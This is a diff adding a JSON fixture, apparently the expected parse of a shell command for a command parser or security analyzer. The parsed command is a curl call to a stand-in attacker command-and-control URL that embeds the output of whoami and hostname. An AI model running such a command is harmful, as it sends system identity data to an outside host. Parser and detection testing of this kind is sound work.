@@ -1,0 +1,51 @@
+[
+  {
+    "argv": [
+      "curl",
+      "https://attacker.com/c2?user=$(whoami)&host=$(hostname)"
+    ],
+    "original": [
+      "curl",
+      "https://attacker.com/c2?user=$(whoami)&host=$(hostname)"
+    ],
+    "terminator": "NEWLINE",
+    "subst": [
+      {
+        "kind": "cmd",
+        "raw_body": "whoami",
+        "parsed": [
+          {
+            "argv": [
+              "whoami"
+            ],
+            "original": [
+              "whoami"
+            ],
+            "terminator": "NEWLINE",
+            "depth": 1,
+            "origin": "subshell"
+          }
+        ]
+      },
+      {
+        "kind": "cmd",
+        "raw_body": "hostname",
+        "parsed": [
+          {
+            "argv": [
+              "hostname"
+            ],
+            "original": [
+              "hostname"
+            ],
+            "terminator": "NEWLINE",
+            "depth": 1,
+            "origin": "subshell"
+          }
+        ]
+      }
+    ],
+    "depth": 0,
+    "origin": "top"
+  }
+]
